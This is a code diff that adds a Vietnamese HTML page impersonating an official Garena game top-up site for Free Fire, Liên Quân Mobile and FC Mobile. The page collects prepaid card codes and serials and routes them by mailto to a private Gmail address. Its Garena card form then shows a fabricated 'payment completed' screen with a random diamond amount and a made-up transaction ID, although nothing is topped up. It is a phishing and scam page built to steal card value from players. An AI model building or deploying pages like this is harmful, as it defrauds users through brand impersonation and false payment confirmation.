@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NAPTHE.VN - Demo</title>
+
+<style>
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:Arial,sans-serif;
+  background:#f5f5f5;
+  color:#292929
+}
+.header{
+  height:82px;
+  background:white;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:10px 20px;
+  border-bottom:1px solid #ddd;
+  position:sticky;
+  top:0;
+  z-index:10
+}
+.logo{
+  display:flex;
+  align-items:center;
+  gap:12px
+}
+.logo-icon{
+  width:55px;
+  height:55px;
+  border-radius:50%;
+  background:linear-gradient(135deg,#ff3b30,#b40000);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  color:white;
+  font-size:30px;
+  font-weight:bold
+}
+.logo-text{
+  font-size:18px;
+  font-weight:bold
+}
+.logo-text small{
+  display:block;
+  color:#e21b12;
+  font-weight:normal;
+  margin-top:4px
+}
+.container{
+  max-width:1100px;
+  margin:auto;
+  padding:15px
+}
+.demo{
+  background:#222;
+  color:#fff;
+  padding:8px;
+  text-align:center;
+  font-size:12px
+}
+.hero{
+  min-height:210px;
+  border-radius:18px;
+  padding:28px;
+  color:white;
+  background:
+  radial-gradient(circle at 80% 30%,#ffe45c,transparent 12%),
+  linear-gradient(120deg,#8d0000,#ed1717 50%,#ff9b00);
+  margin-bottom:22px
+}
+.hero h1{
+  font-size:30px;
+  margin:10px 0
+}
+.hero p{
+  line-height:1.5
+}
+.badges{
+  display:flex;
+  flex-wrap:wrap;
+  gap:8px
+}
+.badge{
+  padding:8px 12px;
+  background:#ffffff25;
+  border:1px solid #ffffff55;
+  border-radius:30px;
+  font-size:12px
+}
+.section{
+  margin-top:22px
+}
+.title{
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:13px
+}
+.number{
+  width:40px;
+  height:40px;
+  background:#e21b12;
+  color:white;
+  border-radius:7px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:22px;
+  font-weight:bold
+}
+.title h2{
+  margin:0;
+  font-size:25px
+}
+.games{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:14px
+}
+.game{
+  background:white;
+  border:2px solid #ddd;
+  border-radius:16px;
+  padding:12px;
+  cursor:pointer;
+  text-align:left
+}
+.game.active{
+  border-color:#e21b12;
+  box-shadow:0 7px 20px #e21b1225
+}
+.game-img{
+  height:115px;
+  border-radius:13px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  font-size:55px
+}
+.ff{background:linear-gradient(135deg,#ffc928,#ff493d,#7627c8)}
+.lq{background:linear-gradient(135deg,#0868ff,#ff476e,#ffb900)}
+.fc{background:linear-gradient(135deg,#00e778,#0878ff,#7725d9)}
+.game-name{
+  font-size:18px;
+  font-weight:bold;
+  margin-top:10px
+}
+.game-info{
+  color:#777;
+  font-size:13px;
+  margin-top:5px
+}
+.banner{
+  margin-top:15px;
+  min-height:85px;
+  border-radius:16px;
+  padding:15px;
+  color:white;
+  display:flex;
+  align-items:center;
+  gap:14px;
+  background:linear-gradient(110deg,#351c25,#a74d30,#ffae2e)
+}
+.banner-icon{
+  width:55px;
+  height:55px;
+  border-radius:14px;
+  background:#ffffff25;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px
+}
+.banner-title{
+  font-size:20px;
+  font-weight:bold
+}
+.safe{
+  display:inline-block;
+  margin-top:5px;
+  padding:5px 9px;
+  background:#0008;
+  border-radius:20px;
+  font-size:12px
+}
+.card{
+  background:white;
+  border:1px solid #ddd;
+  border-radius:17px;
+  padding:18px
+}
+input,select{
+  width:100%;
+  height:54px;
+  border:1px solid #d5d5d5;
+  border-radius:12px;
+  padding:0 14px;
+  font-size:16px;
+  outline:none
+}
+input:focus,select:focus{
+  border-color:#e21b12
+}
+label{
+  display:block;
+  font-weight:bold;
+  margin-bottom:8px
+}
+.login{
+  display:grid;
+  grid-template-columns:1fr auto;
+  gap:10px
+}
+button{
+  border:0;
+  cursor:pointer
+}
+.red-btn{
+  min-height:54px;
+  padding:0 25px;
+  background:#e21b12;
+  color:white;
+  border-radius:12px;
+  font-weight:bold;
+  font-size:16px
+}
+.success{
+  display:none;
+  margin-top:12px;
+  padding:12px;
+  background:#eafff3;
+  color:#078447;
+  border-radius:10px;
+  font-weight:bold
+}
+.success.show{
+  display:block
+}
+.tabs{
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px;
+  margin-bottom:17px
+}
+.tab{
+  height:48px;
+  border:2px solid #ddd;
+  border-radius:30px;
+  background:white;
+  font-weight:bold;
+  font-size:15px
+}
+.tab.active{
+  color:#e21b12;
+  border-color:#e21b12;
+  background:#fff7f6
+}
+.panel{
+  display:none
+}
+.panel.active{
+  display:block
+}
+.form-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:14px
+}
+.full{
+  grid-column:1/-1
+}
+.note{
+  margin-top:12px;
+  background:#fff8e5;
+  border:1px solid #ffdda0;
+  border-radius:10px;
+  padding:11px;
+  font-size:13px;
+  color:#795600
+}
+.prices{
+  margin-top:16px;
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:10px
+}
+.price{
+  background:#fff;
+  border:1px solid #ddd;
+  border-radius:13px;
+  padding:15px;
+  text-align:center;
+  font-weight:bold
+}
+.price span{
+  display:block;
+  color:#18aef0;
+  margin-top:6px
+}
+.payment{
+  display:grid;
+  grid-template-columns:repeat(2,1fr);
+  gap:12px
+}
+.pay{
+  background:white;
+  border:1px solid #ddd;
+  border-radius:15px;
+  min-height:105px;
+  display:flex;
+  align-items:center;
+  gap:14px;
+  padding:15px;
+  font-weight:bold;
+  font-size:16px
+}
+.pay-icon{
+  width:58px;
+  height:58px;
+  border-radius:14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#eee;
+  font-size:28px
+}
+.result{
+  display:none;
+  background:white;
+  border-radius:18px;
+  padding:25px;
+  text-align:center;
+  border:1px solid #ddd
+}
+.result.show{
+  display:block
+}
+.check{
+  width:85px;
+  height:85px;
+  margin:auto;
+  border:8px solid #29c875;
+  color:#29b86b;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:45px;
+  font-weight:bold
+}
+.result h2{
+  font-size:28px
+}
+.rows{
+  margin-top:20px;
+  border-top:1px solid #eee
+}
+.row{
+  display:flex;
+  justify-content:space-between;
+  padding:14px 0;
+  border-bottom:1px solid #eee
+}
+.footer{
+  text-align:center;
+  color:#777;
+  font-size:12px;
+  padding:40px 15px
+}
+
+@media(max-width:700px){
+  .games{
+    grid-template-columns:1fr
+  }
+  .game{
+    display:grid;
+    grid-template-columns:100px 1fr;
+    gap:12px;
+    align-items:center
+  }
+  .game-img{
+    height:95px
+  }
+  .login{
+    grid-template-columns:1fr
+  }
+  .form-grid{
+    grid-template-columns:1fr
+  }
+  .full{
+    grid-column:auto
+  }
+  .prices{
+    grid-template-columns:1fr 1fr
+  }
+  .payment{
+    grid-template-columns:1fr
+  }
+  .hero h1{
+    font-size:25px
+  }
+}
+</style>
+</head>
+
+<body>
+
+<div class="demo">
+Trang nạp chính thức - Garena Free Fire
+</div>
+
+<header class="header">
+  <div class="logo">
+    <div class="logo-icon">G</div>
+    <div class="logo-text">
+      Trung tâm nạp thẻ
+      <small>NAPTHE.VN </small>
+    </div>
+  </div>
+
+  <div id="miniGame">🔥</div>
+</header>
+
+<div class="container">
+
+<div class="hero">
+  <b>NAP GAME • NHANH • GỌN • Trang Nạp Thẻ Uy Tín</b>
+  <h1>Trung tâm nạp thẻ</h1>
+  <p>
+    Chọn trò chơi và phương thức nạp phù hợp.
+    Giao diện được thiết kế 4.0 .
+  </p>
+
+  <div class="badges">
+    <span class="badge">🛡️ Thanh toán an toàn 100%</span>
+    <span class="badge">⚡ Nhanh chóng</span>
+    <span class="badge">📱 Mobile</span>
+  </div>
+</div>
+
+<!-- GAME -->
+<section class="section">
+
+<div class="title">
+  <div class="number">1</div>
+  <h2>Lựa chọn trò chơi</h2>
+</div>
+
+<div class="games">
+
+<button class="game active"
+data-game="Free Fire"
+data-icon="🔥">
+  <div class="game-img ff">🔥</div>
+  <div>
+    <div class="game-name">Free Fire</div>
+    <div class="game-info">Nạp Kim Cương</div>
+  </div>
+</button>
+
+<button class="game"
+data-game="Liên Quân Mobile"
+data-icon="⚔️">
+  <div class="game-img lq">⚔️</div>
+  <div>
+    <div class="game-name">Liên Quân Mobile</div>
+    <div class="game-info">Nạp Quân Huy</div>
+  </div>
+</button>
+
+<button class="game"
+data-game="FC Mobile VN"
+data-icon="⚽">
+  <div class="game-img fc">⚽</div>
+  <div>
+    <div class="game-name">FC Mobile VN</div>
+    <div class="game-info">Nạp FC Points</div>
+  </div>
+</button>
+
+</div>
+
+<div class="banner">
+  <div class="banner-icon" id="bannerIcon">🔥</div>
+
+  <div>
+    <div class="banner-title" id="bannerGame">
+      Free Fire
+    </div>
+
+    <span class="safe">
+      🛡️ Thanh toán an toàn 100%
+    </span>
+  </div>
+</div>
+
+</section>
+
+
+<!-- LOGIN -->
+<section class="section">
+
+<div class="title">
+  <div class="number">1</div>
+  <h2>Đăng nhập</h2>
+</div>
+
+<div class="card">
+
+<label>ID người chơi</label>
+
+<div class="login">
+
+<input
+id="playerID"
+placeholder="Hãy nhập UID của bạn"
+inputmode="numeric">
+
+<button class="red-btn" onclick="login()">
+Đăng nhập
+</button>
+
+</div>
+
+<div id="loginSuccess" class="success">
+✓ Đăng nhập thành công
+</div>
+
+</div>
+
+</section>
+
+
+<!-- TOPUP -->
+<section class="section">
+
+<div class="title">
+  <div class="number">2</div>
+  <h2>Mệnh giá nạp</h2>
+</div>
+
+<div class="card">
+
+<div class="tabs">
+
+<button class="tab active"
+onclick="openTab('online',this)">
+Nạp Online
+</button>
+
+<button class="tab"
+onclick="openTab('garena',this)">
+Thẻ Garena
+</button>
+
+<button class="tab"
+onclick="openTab('shop',this)">
+Shop
+</button>
+
+</div>
+
+
+<!-- ONLINE -->
+
+<div id="online" class="panel active">
+
+<div class="form-grid">
+
+<div>
+<label>Loại thẻ</label>
+
+<select>
+<option>Garena</option>
+<option>Viettel</option>
+<option>Vinaphone</option>
+<option>Mobifone</option>
+</select>
+</div>
+
+<div>
+<label>Mệnh giá</label>
+
+<select>
+<option>10.000đ</option>
+<option>20.000đ</option>
+<option>50.000đ</option>
+<option>100.000đ</option>
+<option>200.000đ</option>
+</select>
+</div>
+
+<div>
+<label>Mã thẻ</label>
+<input id="onlineCode"
+placeholder=" Nhập Mã Thẻ ">
+</div>
+
+<div>
+<label>Số seri</label>
+<input id="onlineSerial"
+placeholder=" Nhập Số Seri ">
+</div>
+
+<div class="full">
+<button class="red-btn"
+style="width:100%"
+onclick="sendMail('Nạp Online')">
+Xác nhận
+</button>
+</div>
+
+</div>
+
+<div class="note">
+📧 Yêu cầu nạp sẽ gửi tới :
+<b>xtinhdz8@gmail.com</b>.
+Đợi Xác Nhận Thẻ!!
+</div>
+
+</div>
+
+
+<!-- GARENA -->
+
+<div id="garena" class="panel">
+
+<label>Mã thẻ Garena </label>
+
+<input
+id="garenaCode"
+maxlength="10"
+inputmode="numeric"
+placeholder="Nhập Mã Thẻ Garena">
+
+<button
+class="red-btn"
+style="width:100%;margin-top:12px"
+onclick="garenaPayment()">
+Xác nhận
+</button>
+
+<div class="prices">
+
+<div class="price">
+5.000đ
+<span>💎 25</span>
+</div>
+
+<div class="price">
+10.000đ
+<span>💎 51</span>
+</div>
+
+<div class="price">
+20.000đ
+<span>💎 113</span>
+</div>
+
+<div class="price">
+50.000đ
+<span>💎 283</span>
+</div>
+
+<div class="price">
+100.000đ
+<span>💎 566</span>
+</div>
+
+<div class="price">
+200.000đ
+<span>💎 1.132</span>
+</div>
+
+<div class="price">
+500.000đ
+<span>💎 2.830</span>
+</div>
+
+</div>
+
+</div>
+
+
+<!-- SHOP -->
+
+<div id="shop" class="panel">
+
+<div class="form-grid">
+
+<div>
+<label>Loại thẻ</label>
+<select>
+<option>Garena</option>
+<option>Viettel</option>
+<option>Vinaphone</option>
+<option>Mobifone</option>
+</select>
+</div>
+
+<div>
+<label>Mệnh giá</label>
+<select>
+<option>10.000đ</option>
+<option>20.000đ</option>
+<option>50.000đ</option>
+<option>100.000đ</option>
+<option>200.000đ</option>
+</select>
+</div>
+
+<div>
+<label>Mã thẻ</label>
+<input id="shopCode"
+placeholder="Nhập Mã Thẻ">
+</div>
+
+<div>
+<label>Số seri</label>
+<input id="shopSerial"
+placeholder="Nhập Số Seri">
+</div>
+
+<div class="full">
+<button
+class="red-btn"
+style="width:100%"
+onclick="sendMail('Shop')">
+Xác nhận
+</button>
+</div>
+
+</div>
+
+<div class="note">
+📧 Yêu Cầu Nạp Sẽ Gửi Tới :
+<b>xtinhdz8@gmail.com</b>.
+Đợi xác nhận thẻ!!
+</div>
+
+</div>
+
+</div>
+</section>
+
+
+<!-- PAYMENT -->
+
+<section class="section">
+
+<div class="title">
+<div class="number">3</div>
+<h2>Phương thức thanh toán</h2>
+</div>
+
+<div class="payment">
+
+<div class="pay">
+<div class="pay-icon">S</div>
+Ví ShopeePay
+</div>
+
+<div class="pay">
+<div class="pay-icon">🖐️</div>
+Garena Sò
+</div>
+
+<div class="pay">
+<div class="pay-icon">▦</div>
+QR Pay
+</div>
+
+<div class="pay">
+<div class="pay-icon">🏦</div>
+Thanh toán qua App Ngân hàng
+</div>
+
+<div class="pay">
+<div class="pay-icon">💳</div>
+ATM - iBanking
+</div>
+
+<div class="pay">
+<div class="pay-icon">💠</div>
+Credit Card / Debit Card
+</div>
+
+</div>
+
+</section>
+
+
+<!-- RESULT -->
+
+<section class="section">
+
+<div id="result" class="result">
+
+<div class="check">✓</div>
+
+<h2>Thanh toán đã hoàn tất!</h2>
+
+<p>
+ID giao dịch:
+<b id="transaction"></b>
+</p>
+
+<div class="rows">
+
+<div class="row">
+<span>Tổng cộng</span>
+<b id="diamond">💎 283</b>
+</div>
+
+<div class="row">
+<span>Game</span>
+<b id="resultGame">Free Fire</b>
+</div>
+
+<div class="row">
+<span>Phương thức thanh toán</span>
+<b>Thẻ Garena</b>
+</div>
+
+<div class="row">
+<span>Thời gian giao dịch</span>
+<b id="time"></b>
+</div>
+
+</div>
+
+<button
+class="red-btn"
+style="width:100%;margin-top:18px"
+onclick="home()">
+Quay lại Trang chủ
+</button>
+
+</div>
+
+</section>
+
+</div>
+
+
+<div class="footer">
+NAPTHE.VN <br>
+Trang Nạp Thẻ Chính Thức - Garena 2026 - NEW.
+<br>
+Xử Lý Nạp Thẻ 24/7.
+</div>
+
+
+<script>
+
+let selectedGame="Free Fire";
+
+
+/* CHỌN GAME */
+
+document.querySelectorAll(".game").forEach(game=>{
+
+game.addEventListener("click",()=>{
+
+document.querySelectorAll(".game")
+.forEach(x=>x.classList.remove("active"));
+
+game.classList.add("active");
+
+selectedGame=game.dataset.game;
+
+document.getElementById("bannerGame")
+.innerText=selectedGame;
+
+document.getElementById("bannerIcon")
+.innerText=game.dataset.icon;
+
+document.getElementById("miniGame")
+.innerText=game.dataset.icon;
+
+});
+
+});
+
+
+/* LOGIN */
+
+function login(){
+
+let id=document.getElementById("playerID").value.trim();
+
+if(!id){
+
+alert("Vui lòng nhập ID người chơi!");
+
+return;
+
+}
+
+document.getElementById("loginSuccess")
+.innerText="✓ Đăng nhập thành công — ID: "+id;
+
+document.getElementById("loginSuccess")
+.classList.add("show");
+
+document.getElementById("topupSection")
+.scrollIntoView({
+behavior:"smooth"
+});
+
+}
+
+
+/* TAB */
+
+function openTab(tab,button){
+
+document.querySelectorAll(".tab")
+.forEach(x=>x.classList.remove("active"));
+
+button.classList.add("active");
+
+document.querySelectorAll(".panel")
+.forEach(x=>x.classList.remove("active"));
+
+document.getElementById(tab)
+.classList.add("active");
+
+}
+
+
+/* GMAIL  */
+
+function sendMail(type){
+
+let subject=
+encodeURIComponent(
+"Yêu cầu nạp game  - "+selectedGame
+);
+
+let body=
+encodeURIComponent(
+"YÊU CẦU NẠP GAME \n"+
+"Game: "+selectedGame+"\n"+
+"Loại: "+type+"\n\n"+
+"Gửi mã thẻ hoặc seri thật."
+);
+
+window.location.href=
+"mailto:xtinhdz8@gmail.com"+
+"?subject="+subject+
+"&body="+body;
+
+}
+
+
+/* THANH TOÁN GARENA  */
+
+function garenaPayment(){
+
+let code=
+document.getElementById("garenaCode")
+.value.trim();
+
+if(!/^[0-9]{10}$/.test(code)){
+
+alert(
+"Mã Thẻ Garena."
+);
+
+return;
+
+}
+
+let diamonds=[
+25,
+51,
+113,
+283,
+566,
+1132,
+2830
+];
+
+let random=
+diamonds[
+Math.floor(Math.random()*diamonds.length)
+];
+
+document.getElementById("diamond")
+.innerText=
+"💎 "+random.toLocaleString("vi-VN");
+
+document.getElementById("resultGame")
+.innerText=selectedGame;
+
+document.getElementById("transaction")
+.innerText=
+Date.now()+
+Math.floor(Math.random()*900+100);
+
+document.getElementById("time")
+.innerText=
+new Intl.DateTimeFormat(
+"vi-VN",
+{
+hour:"2-digit",
+minute:"2-digit",
+second:"2-digit",
+day:"2-digit",
+month:"2-digit",
+year:"numeric"
+}
+).format(new Date());
+
+document.getElementById("result")
+.classList.add("show");
+
+document.getElementById("result")
+.scrollIntoView({
+behavior:"smooth"
+});
+
+}
+
+
+/* HOME */
+
+function home(){
+
+document.getElementById("result")
+.classList.remove("show");
+
+window.scrollTo({
+top:0,
+behavior:"smooth"
+});
+
+}
+
+</script>
+
+</body>
+</html>
